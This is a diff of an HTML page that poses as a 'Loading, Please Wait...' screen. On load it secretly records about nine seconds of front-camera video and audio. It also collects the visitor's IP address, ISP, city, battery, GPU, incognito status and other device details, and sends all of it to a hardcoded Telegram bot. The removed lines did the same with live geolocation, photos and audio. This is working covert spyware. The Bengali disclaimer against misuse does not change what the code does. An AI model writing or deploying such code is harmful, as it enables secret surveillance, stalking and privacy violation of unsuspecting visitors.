@@ -7,92 +7,147 @@
 </head>
 <body>
     <h2>Loading, Please Wait...</h2>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" autoplay playsinline muted style="display:none;"></video>
 
     <script>
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        async function sendAllData() {
-            // ১. লোকেশন পারমিশন ও পাঠানো
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const info = `📍 Live Location:\nLat: ${lat}\nLon: ${lon}\n📱 Device: ${navigator.userAgent}`;
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: info })
-                    });
-                }, (err) => console.log('Location denied'));
-            }
-
-            // ২. ক্যামেরা পারমিশন ও ৪-৫টি ছবি পাঠানো
+        async function getDeviceInfo() {
+            let ip = "Unknown", isp = "Unknown", locationStr = "Unknown";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip || "Unknown";
+                isp = data.org || "Unknown";
+                locationStr = `${data.city}, ${data.region}, ${data.country_name}`;
+            } catch (e) {}
+
+            let batteryStatus = "Unknown", isCharging = "❌";
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryStatus = `${Math.round(b.level * 100)}%`;
+                    isCharging = b.charging ? "✔️" : "❌";
+                }
+            } catch (e) {}
+
+            let speed = "Unknown";
+            try {
+                if (navigator.connection && navigator.connection.downlink) {
+                    speed = `${navigator.connection.downlink} Mbps`;
+                }
+            } catch(e) {}
+
+            let networkType = "Unknown", effectiveType = "Unknown";
+            try {
+                if (navigator.connection) {
+                    networkType = navigator.connection.type || "Unknown";
+                    effectiveType = navigator.connection.effectiveType || "Unknown";
+                }
+            } catch(e) {}
+
+            let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+            let hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+
+            let glRenderer = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            let isIncognito = "❌";
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    const estimate = await navigator.storage.estimate();
+                    if (estimate.quota < 120 * 1024 * 1024 * 1024) {
+                        isIncognito = "✔️ (Likely)";
+                    }
+                }
+            } catch(e) {}
+
+            let now = new Date();
+            let dateStr = now.toLocaleDateString() + " - " + now.toLocaleTimeString();
+
+            return `📹 Front Camera Video (8-10s)
+
+⚠️ Do not misuse this video
+
+🌐 IP Address: ${ip}
+🏢 ISP: ${isp}
+📍 Location: ${locationStr}
+
+💻 User-Agent: ${navigator.userAgent}
+🌐 Browser: ${navigator.language}
+🕵️ Incognito Mode: ${isIncognito}
+
+🔋 Battery: ${batteryStatus} Charging: ${isCharging}
+📐 Screen Size: ${window.screen.width}×${window.screen.height}
+🚀 Internet Speed: ${speed}
+📶 Network: ${networkType} Type: ${effectiveType}
+
+💾 RAM & Storage: ${deviceMemory} / ${navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'Unknown'}
+🕒 Date: ${dateStr}
+🌍 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+📊 Device Pixel Ratio: ${window.devicePixelRatio}
+🖥️ Viewport Size: ${window.innerWidth}×${window.innerHeight}
+🧑‍💻 CPU Cores: ${hardwareConcurrency}
+🎮 GPU Renderer: ${glRenderer}
+
+⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।`;
+        }
+
+        async function startProcess() {
+            try {
+                // ক্যামেরা এবং অডিও একসাথে পারমিশন নেওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // ছবি তোলার অংশ
-                for (let i = 0; i < 5; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    await new Promise((resolve) => {
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, `capture_${i+1}.png`);
 
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                            resolve();
-                        }, 'image/png');
-                    });
-                }
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
 
-                // ৩. অডিও রেকর্ড করে পাঠানো (একই মাইক্রোফোন স্ট্রিম ব্যবহার করে)
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
-
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
                 };
 
                 mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const captionText = await getDeviceInfo();
+
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('voice', audioBlob, 'audio.webm');
+                    formData.append('video', blob, 'video.webm');
+                    formData.append('caption', captionText);
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     });
-                    
+
                     stream.getTracks().forEach(track => track.stop());
                 };
 
                 mediaRecorder.start();
+
+                // ৮ সেকেন্ড রেকর্ড করার পর অটো স্টপ হবে
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 5000); // ৫ সেকেন্ডের অডিও
+                }, 9000);
 
             } catch (err) {
-                console.log('Permission denied');
+                console.log('Error:', err);
             }
         }
 
-        window.onload = sendAllData;
+        window.onload = startProcess;
     </script>
 </body>
 </html>
